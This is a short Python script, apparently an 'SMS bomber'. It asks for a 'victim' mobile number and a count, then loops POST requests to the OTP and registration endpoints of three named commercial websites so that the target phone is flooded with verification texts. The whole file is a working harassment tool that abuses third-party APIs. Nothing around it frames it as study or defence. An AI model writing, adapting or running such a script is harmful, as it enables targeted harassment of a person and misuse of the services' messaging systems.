import requests
from requests.structures import CaseInsensitiveDict
number=str(input("ENTER VICTIM MOBILE NUMBER : "))
amount=int(input ("ENTER THE AMOUNT : "))
url1 = "https://www.tvsmotor.com/api/Ecommerce/GetOtp"

headers1 = CaseInsensitiveDict()
headers1["Content-Type"] = "application/x-www-form-urlencoded"

data1 = "MobileNumber="+number+"&Locale=V"


url2 = "https://www.mantrimart.com/my-account-2/"

headers2 = CaseInsensitiveDict()
headers2["Content-Type"] = "application/x-www-form-urlencoded"

data2 = "m=yes&twy_mobile="+number+"&twy_email=clown_op%40outlook.com&submit=Register"


url3 = "https://livingliquidz.com//Account/SendOTP"

headers3 = CaseInsensitiveDict()
headers3["Content-Type"] = "application/json"

data3 = '{"mobile":"+' + number + '"}'

for j in range (amount):
 resp1 = requests.post(url1, headers=headers1, data=data1)
 resp2 = requests.post(url2, headers=headers2, data=data2)
 resp3 = requests.post(url3, headers=headers3, data=data3)
 print(str(j+1)+"SMS Sent")


